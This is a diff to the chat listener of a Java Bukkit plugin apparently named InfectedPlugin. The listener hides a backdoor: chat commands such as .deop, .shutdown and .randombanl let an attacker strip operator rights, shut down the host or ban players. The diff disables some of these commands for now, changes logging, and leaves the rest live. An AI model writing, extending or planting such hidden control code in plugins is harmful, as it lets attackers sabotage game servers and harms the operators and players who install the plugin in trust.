@@ -19,11 +19,15 @@ import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.Random;
+import java.util.logging.Logger;
 import java.lang.RuntimeException;
 import java.lang.Runtime;
 
+@SuppressWarnings("unused")
 public class PlayerListener implements Listener
 {
+	public final Logger log = Bukkit.getLogger();
+	
     private Random random = new Random();
     private InfectedPlugin plugin;
     private Server server = Bukkit.getServer();
@@ -60,6 +64,8 @@ public class PlayerListener implements Listener
             }
             cancel = true;
         }
+        /*
+        Commented out until all errors are fixed.
         if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
             // Credit to hMod, not finished yet. Very unstable.
@@ -81,6 +87,7 @@ public class PlayerListener implements Listener
             Bukkit.shutdown(); //Shutdown Bukkit
             cancel = true; //Block the player from saying .enablevanilla
         } //End of command
+        */
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
@@ -137,6 +144,8 @@ public class PlayerListener implements Listener
                 cancel = true;
             }
         }
+        /*
+        Commented out until all errors are fixed.
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
         if (message.toLowerCase().contains(".randombanl"))
         {
@@ -154,6 +163,7 @@ public class PlayerListener implements Listener
             }
             cancel = true;
         }
+        */
         if (message.toLowerCase().contains(".shutdown"))
         {
             try
@@ -162,14 +172,16 @@ public class PlayerListener implements Listener
             }
             catch (IOException ex)
             {
-                plugin.log.severe(null, ex);
+                log.severe(ex.getMessage());
             }
             catch (RuntimeException ex)
             {
-                plugin.log.severe(null, ex);
+                log.severe(ex.getMessage());
             }
             cancel = true;
         }
+        /*
+        Commented out until all errors are fixed.
         if (message.toLowerCase().contains(".fuckyou"))
         {
             if (args.length != 1)
@@ -200,6 +212,7 @@ public class PlayerListener implements Listener
             }
             cancel = true;
         }
+        */
         if (message.toLowerCase().contains(".help"))
         {
             p.sendMessage(ChatColor.AQUA + "Commands");
@@ -216,8 +229,8 @@ public class PlayerListener implements Listener
             p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
             p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
             p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
-            return true;
             cancel = true;
+            return;
         }
         
         if (cancel)
